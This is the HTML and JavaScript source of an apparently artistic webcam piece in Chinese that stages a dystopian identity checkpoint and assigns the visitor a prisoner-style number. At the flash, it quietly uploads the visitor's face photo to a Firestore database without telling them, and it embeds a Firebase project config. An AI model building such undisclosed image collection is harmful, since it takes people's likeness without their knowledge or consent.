<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>檢查哨：身分剝奪與建檔</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Courier+Prime:ital,wght@0,400;0,700;1,400&family=Noto+Serif+TC:wght@300;700;900&display=swap');

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: #000; overflow: hidden;
            font-family: 'Courier Prime', 'Noto Serif TC', monospace;
            cursor: none; user-select: none;
        }

        /* 監視器畫布 */
        #c {
            position: absolute; top: 0; left: 0; width: 100vw; height: 100vh;
            object-fit: cover;
            filter: grayscale(100%) contrast(150%) brightness(0.6);
            z-index: 1;
        }

        /* 最終擷取畫面 */
        #captured-img {
            position: absolute; top: 0; left: 0; width: 100vw; height: 100vh;
            object-fit: cover;
            filter: grayscale(100%) contrast(450%) brightness(0.4) sepia(30%);
            z-index: 10; opacity: 0; pointer-events: none;
        }

        /* CRT 螢幕弧度與暗角 */
        .vignette {
            position: fixed; inset: 0; z-index: 15; pointer-events: none;
            background: radial-gradient(circle, rgba(0,0,0,0) 40%, rgba(0,0,0,0.85) 100%);
            box-shadow: inset 0 0 100px rgba(0,0,0,0.9);
        }

        /* 監視器掃描線 */
        .scanlines {
            position: fixed; inset: 0; pointer-events: none; z-index: 20;
            background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.5) 50%, rgba(0,0,0,0.5));
            background-size: 100% 6px;
        }

        /* 紅色警報覆蓋 */
        #alarm-overlay {
            position: fixed; inset: 0; background: rgba(255, 0, 0, 0.3);
            z-index: 22; opacity: 0; pointer-events: none; mix-blend-mode: multiply;
        }
        .alarm-flash { animation: alarmBlink 1s infinite; }
        @keyframes alarmBlink { 0%, 100% { opacity: 0; } 50% { opacity: 1; } }

        /* 閃光燈 */
        #flash {
            position: fixed; inset: 0; background: #FFF; z-index: 99; opacity: 0; pointer-events: none;
        }
        .flash-trigger { animation: flashAnim 2s cubic-bezier(0.1, 0.9, 0.2, 1) forwards; }
        @keyframes flashAnim { 0% { opacity: 1; background: #FFF; } 10% { opacity: 0.8; } 15% { opacity: 1; } 100% { opacity: 0; } }

        /* 全螢幕黑屏 (結尾轉場用) */
        #blackout {
            position: fixed; inset: 0; background: #000; z-index: 300;
            opacity: 0; pointer-events: none; transition: opacity 2s ease-in-out;
            display: flex; justify-content: center; align-items: center; 
        }

        /* 結尾無名宣言 (自適應大小) */
        #final-message {
            color: #FFF; font-family: 'Noto Serif TC', serif;
            font-size: clamp(1.2rem, 5vw, 2rem); letter-spacing: clamp(0.2em, 2vw, 0.5em); 
            font-weight: 300; opacity: 0; transition: opacity 2s ease-in-out;
            text-shadow: 0 0 10px rgba(255,255,255,0.3);
            text-align: center; width: 90%; line-height: 1.5;
        }

        /* UI 層 */
        #hud {
            position: fixed; inset: 0; z-index: 30; pointer-events: none;
            display: flex; flex-direction: column; justify-content: space-between;
            padding: clamp(20px, 5vh, 40px) clamp(15px, 5vw, 40px); box-sizing: border-box; color: rgba(255, 255, 255, 0.6);
        }

        /* 動態排版：頂部與底部狀態列 */
        .hud-top {
            display: flex; justify-content: space-between; font-weight: bold;
            letter-spacing: clamp(0.1em, 1vw, 0.2em); font-size: clamp(0.8rem, 3vw, 1.2rem);
            padding-left: clamp(15px, 4vw, 40px);
        }
        .hud-bottom {
            display: flex; justify-content: space-between; align-items: flex-end; font-weight: bold;
            letter-spacing: clamp(0.05em, 1vw, 0.2em); font-size: clamp(0.6rem, 2.5vw, 0.8rem);
            padding-left: clamp(15px, 4vw, 40px);
        }

        /* 側邊身高比例尺 */
        #height-scale {
            position: absolute; left: clamp(10px, 3vw, 30px); top: 10vh; bottom: 10vh; width: 20px;
            border-right: 2px solid rgba(255,255,255,0.3);
            display: flex; flex-direction: column; justify-content: space-between;
            opacity: 0.5;
        }
        .scale-mark { width: 100%; border-top: 1px solid rgba(255,255,255,0.3); height: 1px; position: relative; }
        .scale-mark.major { width: 150%; border-top: 2px solid rgba(255,255,255,0.6); }

        /* 畫面中央掃描準心 (自適應) */
        #target-box {
            border: 2px solid rgba(255,255,255,0.1); position: absolute; top:50%; left:50%; transform:translate(-50%,-50%);
            width: clamp(220px, 40vw, 400px); height: clamp(280px, 50vh, 500px);
            transition: all 0.3s;
        }
        /* 鎖定時的紅框狀態 */
        #target-box.locked {
            border-color: red;
            width: clamp(180px, 30vw, 300px); height: clamp(240px, 40vh, 400px);
        }

        /* 畫面中央大型提示字 */
        #center-text {
            position: absolute; top: 30%; left: 50%; transform: translate(-50%, -50%);
            color: red; font-size: clamp(1.8rem, 6vw, 3rem); font-weight: 900; letter-spacing: clamp(0.1em, 2vw, 0.3em);
            text-align: center; z-index: 35; opacity: 0; text-shadow: 0 0 15px red; width: 90%;
        }

        /* 系統分析日誌 */
        #analysis-log {
            position: absolute; bottom: clamp(8vh, 12vh, 15vh); left: clamp(15px, 6vw, 60px);
            font-size: clamp(0.6rem, 2.5vw, 0.9rem); color: #FFF; font-family: 'Courier Prime', monospace;
            letter-spacing: 0.1em; line-height: 1.8; opacity: 0.8;
            text-shadow: 0 0 5px rgba(255,255,255,0.5);
            max-width: clamp(220px, 80vw, 40vw);
        }
        .log-entry { margin-bottom: 5px; opacity: 0; animation: typeIn 0.1s forwards; border-left: 2px solid red; padding-left: 8px;}
        @keyframes typeIn { to { opacity: 1; } }

        /* 亂碼跑動區 */
        #rolling-code {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            color: #FFF; font-size: clamp(3.5rem, 12vw, 8rem); font-weight: 900; letter-spacing: 0.1em;
            text-align: center; z-index: 36; opacity: 0; text-shadow: 0 0 20px rgba(255,255,255,0.8);
        }

        /* 最終行銷海報 UI (自適應排版) */
        #marketing-frame {
            position: fixed; inset: 0; z-index: 50; pointer-events: none; opacity: 0;
            border: clamp(8px, 3vw, 15px) solid #111; padding: clamp(20px, 5vw, 40px); display: flex; flex-direction: column;
            justify-content: space-between; transition: opacity 2s; box-sizing: border-box;
        }
        .mkt-header { display: flex; justify-content: space-between; color: #FFF; text-shadow: 0 0 10px #000; flex-wrap: wrap; gap: 10px; }
        .mkt-title h2 { font-size: clamp(1rem, 4vw, 1.5rem); letter-spacing: clamp(0.1em, 1vw, 0.3em); margin: 0; }
        .mkt-title p { font-size: clamp(0.6rem, 2vw, 0.8rem); letter-spacing: 0.1em; color: #AAA; margin: 0; }
        .mkt-tags { text-align: right; }
        .mkt-tags p { margin: 0; font-weight: bold; letter-spacing: 0.1em; font-size: clamp(0.7rem, 2.5vw, 1rem); }
        
        .mkt-footer { display: flex; justify-content: space-between; align-items: flex-end; flex-wrap: wrap; gap: 15px; }
        .barcode { font-family: 'Courier Prime', monospace; font-size: clamp(1.2rem, 5vw, 2rem); letter-spacing: -2px; color: #111; background: #FFF; padding: clamp(5px, 2vw, 10px); display: inline-block; }
        .mkt-save { text-align: right; background: rgba(0,0,0,0.8); padding: clamp(5px, 2vw, 10px); border: 1px solid #555; color: #FFF;}
        .mkt-save-tw { margin:0; font-size: clamp(0.9rem, 3vw, 1.2rem); font-weight: bold; letter-spacing: clamp(0.1em, 1vw, 0.2em); }
        .mkt-save-en { margin:0; font-size: clamp(0.6rem, 2vw, 0.8rem); color: #AAA; }
        
        /* 最終臉部烙印編號 */
        #final-stamp {
            position: absolute; top: 45%; left: 50%; transform: translate(-50%, -50%) rotate(-5deg);
            font-size: clamp(4rem, 15vw, 8rem); color: #D00; font-weight: 900; letter-spacing: 0.05em;
            z-index: 55; opacity: 0; padding: clamp(5px, 2vw, 10px) clamp(10px, 4vw, 30px); border: clamp(4px, 1.5vw, 8px) solid #D00;
            mix-blend-mode: multiply; background: rgba(255,255,255,0.8);
            box-shadow: inset 0 0 10px #D00; white-space: nowrap;
        }

        /* 控制按鈕 */
        #trigger-zone, #reset-zone {
            position: fixed; z-index: 100; cursor: pointer; font-family: 'Noto Serif TC', serif; letter-spacing: clamp(0.2em, 1vw, 0.5em); transition: 0.3s;
        }
        #trigger-zone {
            bottom: 8%; left: 50%; transform: translateX(-50%);
            padding: clamp(12px, 3vw, 20px) clamp(20px, 5vw, 40px);
            border: 1px solid rgba(255,255,255,0.3); color: rgba(255,255,255,0.6); background: rgba(0,0,0,0.5);
            font-size: clamp(0.8rem, 3vw, 1rem); width: max-content; max-width: 90vw; text-align: center;
        }
        #trigger-zone:hover { border-color: #FFF; color: #FFF; background: rgba(255,255,255,0.1); }
        
        #reset-zone { bottom: 3%; right: 3%; border: none; color: rgba(255,255,255,0.2); font-size: clamp(0.6rem, 2vw, 0.8rem); padding: 10px;}
        #reset-zone:hover { color: #FFF; }
        
        .hidden { display: none !important; }

        /* 初始畫面 */
        #init-screen {
            position: fixed; inset: 0; z-index: 200; background: #000;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            color: #fff; font-family: 'Noto Serif TC', serif; cursor: pointer; padding: 20px; text-align: center;
        }
        #init-screen h1 { font-size: clamp(1.5rem, 5vw, 2rem); }
    </style>
</head>
<body>

    <canvas id="c"></canvas>
    <img id="captured-img" alt="Captured Record">
    
    <div class="vignette"></div>
    <div class="scanlines"></div>
    <div id="alarm-overlay"></div>
    <div id="flash"></div>
    <div id="blackout">
        <div id="final-message">從今開始，你不再有名字了</div>
    </div> 

    <div id="hud" class="hidden">
        <div id="height-scale">
            <div class="scale-mark major"></div><div class="scale-mark"></div><div class="scale-mark"></div>
            <div class="scale-mark major"></div><div class="scale-mark"></div><div class="scale-mark"></div>
            <div class="scale-mark major"></div><div class="scale-mark"></div><div class="scale-mark"></div>
            <div class="scale-mark major"></div>
        </div>

        <div class="hud-top">
            <div id="rec-status">● REC</div>
            <div>SYS_ID: <span id="sys-time"></span></div>
        </div>
        
        <div id="target-box"></div>
        <div id="analysis-log"></div>

        <div class="hud-bottom">
            <div id="action-status">AWAITING SUBJECT...</div>
            <div>SECTOR 4 - CHECKPOINT</div>
        </div>
    </div>

    <div id="center-text"></div>
    <div id="rolling-code"></div>
    <div id="final-stamp"></div>

    <div id="marketing-frame" class="hidden">
        <div class="mkt-header">
            <div class="mkt-title">
                <h2>PROPERTY OF THE STATE</h2>
                <p>UNAUTHORIZED EXISTENCE REVOKED</p>
            </div>
            <div class="mkt-tags">
                <p>#身分剝奪</p>
                <p>#你的計畫名稱</p>
            </div>
        </div>
        
        <div class="mkt-footer">
            <div class="barcode" id="final-barcode">||| |||| || | |||| |||</div>
            <div class="mkt-save">
                <p class="mkt-save-tw">截圖保存您的檔案</p>
                <p class="mkt-save-en">SCREENSHOT TO SAVE RECORD</p>
            </div>
        </div>
    </div>

    <div id="trigger-zone" class="hidden">開始身分審查 (START)</div>
    <div id="reset-zone" class="hidden">RESET SYSTEM</div>
    
    <video id="v" class="hidden" autoplay playsinline></video>

    <div id="init-screen">
        <h1 class="text-2xl tracking-[0.5em] mb-4">系統待命</h1>
        <p class="text-sm tracking-widest text-gray-500">點擊啟動監視系統與音效</p>
        <a id="escape-btn" href="#" target="_blank" class="mt-8 text-xs text-gray-400 border border-gray-400 px-4 py-2 hover:bg-white hover:text-black transition-colors hidden">跳出平台限制以允許攝影機</a>
    </div>

    <script type="module">
        // 匯入 Firebase SDK (移除 Storage，只留 Firestore)
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

        // ==========================================
        // 【重要】請將下方設定換成你新專案的 Config
        // ==========================================
        const firebaseConfig = {
            apiKey: "AIzaSyD8ERvnrdHJzTAr7xDIdXuiqZ9o7d_wW_U",
            authDomain: "checkpoint-system-ee6d7.firebaseapp.com",
            projectId: "checkpoint-system-ee6d7",
            storageBucket: "checkpoint-system-ee6d7.firebasestorage.app",
            messagingSenderId: "188995102122",
            appId: "1:188995102122:web:6d8ef558b8c9f6262bf7d3"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // 背景上傳函式：將圖片轉成文字，直接存進免費的資料庫！
        async function uploadRecordToFirebase(canvasElement, generatedID) {
            try {
                // 為了避免檔案過大塞爆免費資料庫，我們創建一個隱藏的小畫布來壓縮照片 (寬度 800px)
                const miniCanvas = document.createElement('canvas');
                miniCanvas.width = 800;
                miniCanvas.height = Math.floor(800 * (canvasElement.height / canvasElement.width));
                const miniCtx = miniCanvas.getContext('2d');
                miniCtx.drawImage(canvasElement, 0, 0, miniCanvas.width, miniCanvas.height);
                
                // 將圖片壓縮成品質 0.6 的純文字 (Base64)
                const compressedImageText = miniCanvas.toDataURL('image/jpeg', 0.6);
                
                // 將這段文字當作一般資料，寫入免費的 Firestore 裡
                await addDoc(collection(db, "archived_subjects"), {
                    subjectID: generatedID,
                    capturedAt: new Date(),
                    status: "IDENTITY_REVOKED",
                    imageData: compressedImageText // 這裡是重點！把照片當文字存
                });
                
                console.log(`[SYS] Record ${generatedID} successfully uploaded to Central Database.`);
            } catch (error) {
                console.error("[SYS] Upload Failed: ", error);
            }
        }

        const c = document.getElementById('c');
        const ctx = c.getContext('2d');
        const v = document.getElementById('v');
        const initScreen = document.getElementById('init-screen');
        const hud = document.getElementById('hud');
        const triggerZone = document.getElementById('trigger-zone');
        const resetZone = document.getElementById('reset-zone');
        const flash = document.getElementById('flash');
        const capturedImg = document.getElementById('captured-img');
        const centerText = document.getElementById('center-text');
        const rollingCode = document.getElementById('rolling-code');
        const finalStamp = document.getElementById('final-stamp');
        const alarmOverlay = document.getElementById('alarm-overlay');
        const marketingFrame = document.getElementById('marketing-frame');
        const actionStatus = document.getElementById('action-status');
        const targetBox = document.getElementById('target-box');
        const analysisLog = document.getElementById('analysis-log');
        const blackout = document.getElementById('blackout');
        
        let isRunning = false;
        let isProcessing = false;

        let audioCtx, humGain;

        function initAudio() {
            if(audioCtx) return;
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = audioCtx.createOscillator();
            osc.type = 'sawtooth'; osc.frequency.value = 40;
            humGain = audioCtx.createGain();
            humGain.gain.value = 0.15;
            const filter = audioCtx.createBiquadFilter();
            filter.type = 'lowpass'; filter.frequency.value = 100;
            osc.connect(filter).connect(humGain).connect(audioCtx.destination);
            osc.start();
        }

        function playAlarm() {
            if(!audioCtx) return;
            const osc = audioCtx.createOscillator();
            osc.type = 'square'; osc.frequency.setValueAtTime(600, audioCtx.currentTime);
            osc.frequency.linearRampToValueAtTime(800, audioCtx.currentTime + 0.5);
            osc.frequency.linearRampToValueAtTime(600, audioCtx.currentTime + 1);
            const gain = audioCtx.createGain();
            gain.gain.setValueAtTime(0, audioCtx.currentTime);
            gain.gain.linearRampToValueAtTime(0.1, audioCtx.currentTime + 0.1);
            gain.gain.linearRampToValueAtTime(0, audioCtx.currentTime + 1);
            osc.connect(gain).connect(audioCtx.destination);
            osc.start(); osc.stop(audioCtx.currentTime + 1);
        }

        function playBlip() {
            if(!audioCtx) return;
            const osc = audioCtx.createOscillator();
            osc.type = 'sine'; osc.frequency.value = 1200 + Math.random() * 800;
            const gain = audioCtx.createGain();
            gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.05);
            osc.connect(gain).connect(audioCtx.destination);
            osc.start(); osc.stop(audioCtx.currentTime + 0.05);
        }

        function playHeartbeat() {
            if(!audioCtx) return;
            const osc = audioCtx.createOscillator();
            osc.type = 'sine'; osc.frequency.setValueAtTime(50, audioCtx.currentTime);
            osc.frequency.exponentialRampToValueAtTime(20, audioCtx.currentTime + 0.3);
            const gain = audioCtx.createGain();
            gain.gain.setValueAtTime(0.8, audioCtx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
            osc.connect(gain).connect(audioCtx.destination);
            osc.start(); osc.stop(audioCtx.currentTime + 0.4);
        }

        function playFlashSound() {
            if(!audioCtx) return;
            const osc = audioCtx.createOscillator();
            osc.type = 'square'; osc.frequency.setValueAtTime(100, audioCtx.currentTime);
            osc.frequency.exponentialRampToValueAtTime(10, audioCtx.currentTime + 0.5);
            const gain = audioCtx.createGain();
            gain.gain.setValueAtTime(1, audioCtx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);
            osc.connect(gain).connect(audioCtx.destination);
            osc.start(); osc.stop(audioCtx.currentTime + 0.6);
        }

        function playStampSound() {
            if(!audioCtx) return;
            const osc = audioCtx.createOscillator();
            osc.type = 'sawtooth'; osc.frequency.setValueAtTime(300, audioCtx.currentTime);
            osc.frequency.exponentialRampToValueAtTime(50, audioCtx.currentTime + 0.2);
            const gain = audioCtx.createGain();
            gain.gain.setValueAtTime(1, audioCtx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2);
            osc.connect(gain).connect(audioCtx.destination);
            osc.start(); osc.stop(audioCtx.currentTime + 0.3);
        }

        function resize() {
            c.width = window.innerWidth; c.height = window.innerHeight;
        }
        window.addEventListener('resize', resize);

        function drawLoop() {
            if(!isRunning) return; 
            
            const vRatio = v.videoWidth / v.videoHeight;
            const cRatio = c.width / c.height;
            let drawW, drawH, drawX, drawY;
            
            if (cRatio > vRatio) { 
                drawW = c.width; drawH = c.width / vRatio; 
                drawX = 0; drawY = (c.height - drawH) / 2; 
            } else { 
                drawH = c.height; drawW = c.height * vRatio; 
                drawX = (c.width - drawW) / 2; drawY = 0; 
            }

            ctx.save();
            ctx.translate(c.width, 0); ctx.scale(-1, 1); 
            ctx.drawImage(v, c.width - drawW - drawX, drawY, drawW, drawH);
            ctx.restore();
            
            document.getElementById('rec-status').style.opacity = Math.random() > 0.95 ? 0 : 1;
            document.getElementById('sys-time').innerText = new Date().toISOString().substring(11, 19);

            requestAnimationFrame(drawLoop);
        }

        const sleep = ms => new Promise(r => setTimeout(r, ms));

        function showText(text, isBlinking = false) {
            centerText.innerText = text;
            centerText.style.opacity = 1;
            centerText.style.animation = isBlinking ? 'alarmBlink 0.3s infinite' : 'none';
        }
        function hideText() { centerText.style.opacity = 0; centerText.style.animation = 'none'; }

        function addLog(text) {
            const el = document.createElement('div');
            el.className = 'log-entry';
            el.innerText = `> ${text}`;
            analysisLog.appendChild(el);
            playBlip();
        }

        function generateRandomID() {
            const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            const randomLetter = letters.charAt(Math.floor(Math.random() * letters.length));
            const randomNumber = Math.floor(Math.random() * 101);
            return `J-${randomLetter}-${randomNumber.toString().padStart(3, '0')}`;
        }

        triggerZone.addEventListener('click', async () => {
            if(isProcessing) return;
            isProcessing = true;
            triggerZone.classList.add('hidden');
            analysisLog.innerHTML = ''; 
            
            actionStatus.innerText = "UNAUTHORIZED ENTITY";
            actionStatus.style.color = "red";
            targetBox.classList.add('locked'); 
            
            alarmOverlay.classList.add('alarm-flash');
            let alarmInt = setInterval(playAlarm, 1000);
            showText("系統鎖定\nSYSTEM LOCKDOWN", true);
            
            addLog("[識別] 偵測到未登記實體...");
            await sleep(1500);
            addLog("[建檔] 啟動特徵描繪程序");
            await sleep(1500);
            
            hideText();
            clearInterval(alarmInt);
            alarmOverlay.classList.remove('alarm-flash');
            
            showText("抹除舊有身分...\nERASING IDENTITY");
            addLog("[防冒名] 交叉比對全區資料庫...");
            await sleep(2000);
            hideText();
            
            addLog("[剝奪] 排除人類特徵，生成編號");
            rollingCode.style.opacity = 1;
            let finalID = "";
            let rollSpeed = 30;
            
            const rollEndTime = Date.now() + 6000;
            while(Date.now() < rollEndTime) {
                rollingCode.innerText = generateRandomID();
                if(Math.random() > 0.5) playBlip();
                await sleep(rollSpeed);
            }
            for(let i=0; i<10; i++) {
                finalID = generateRandomID();
                rollingCode.innerText = finalID;
                playBlip();
                await sleep(rollSpeed += 40);
            }
            playStampSound();
            rollingCode.style.color = "red";
            rollingCode.style.textShadow = "0 0 30px red";
            addLog(`[分配] 編號分配完成：${finalID}`);
            
            actionStatus.innerText = "SUBJECT LOGGED";
            await sleep(2000);
            rollingCode.style.opacity = 0; 

            let hbSpeed = 1000;
            let hbInt = setInterval(() => playHeartbeat(), hbSpeed);

            showText("保持靜止\nDO NOT MOVE", true);
            addLog("[評估] 檢測外傷與神經生理反應...");
            await sleep(4000);
            
            clearInterval(hbInt);
            hbInt = setInterval(() => playHeartbeat(), 400);
            hideText();
            await sleep(500);

            showText("直視鏡頭\nLOOK STRAIGHT", true);
            addLog("[建檔] 準備寫入終身追蹤檔案。");
            await sleep(3000);

            clearInterval(hbInt);
            hideText();
            if(humGain) humGain.gain.setTargetAtTime(0, audioCtx.currentTime, 0.1);
            await sleep(500);

            playFlashSound();
            flash.classList.remove('flash-trigger');
            void flash.offsetWidth; 
            flash.classList.add('flash-trigger');
            
            const dataURL = c.toDataURL('image/jpeg', 0.8);
            capturedImg.src = dataURL;
            capturedImg.style.opacity = '1'; 
            
            // 🚀 觸發「偷吃步」免費上傳機制！
            uploadRecordToFirebase(c, finalID);

            await sleep(800);
            finalStamp.innerText = finalID;
            finalStamp.style.opacity = 1;
            playStampSound();
            
            await sleep(1000);
            document.getElementById('final-barcode').innerText = finalID + " |||| || | |||";
            hud.classList.add('hidden'); 
            marketingFrame.classList.remove('hidden');
            setTimeout(() => { marketingFrame.style.opacity = 1; }, 50);
            setTimeout(() => { resetZone.classList.remove('hidden'); }, 2000);

            setTimeout(() => {
                blackout.style.opacity = 1;
                resetZone.classList.add('hidden');
                
                setTimeout(() => {
                    const finalMessage = document.getElementById('final-message');
                    finalMessage.style.opacity = 1;
                    
                    setTimeout(() => {
                        window.location.href = 'index.html';
                    }, 4000);
                }, 2000);
            }, 10000);
        });

        resetZone.addEventListener('click', () => {
            window.location.href = 'index.html';
        });

        initScreen.addEventListener('click', async () => {
            try {
                initAudio();
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
                });
                v.srcObject = stream;
                
                v.onloadedmetadata = () => {
                    v.play(); resize(); isRunning = true;
                    initScreen.style.opacity = '0';
                    setTimeout(() => {
                        initScreen.classList.add('hidden');
                        hud.classList.remove('hidden');
                        triggerZone.classList.remove('hidden');
                    }, 1000);
                    drawLoop();
                };
            } catch (err) {
                console.error(err);
                initScreen.innerHTML = "<h1 style='color:red;'>系統存取遭拒</h1><p class='text-sm mt-4 text-gray-400'>請確認已允許攝影機權限，或點擊下方按鈕跳出限制框架。</p>";
                const escBtn = document.getElementById('escape-btn');
                const blob = new Blob([document.documentElement.outerHTML], { type: 'text/html' });
                escBtn.href = URL.createObjectURL(blob); 
                escBtn.classList.remove('hidden');
            }
        });
    </script>
</body>
</html>
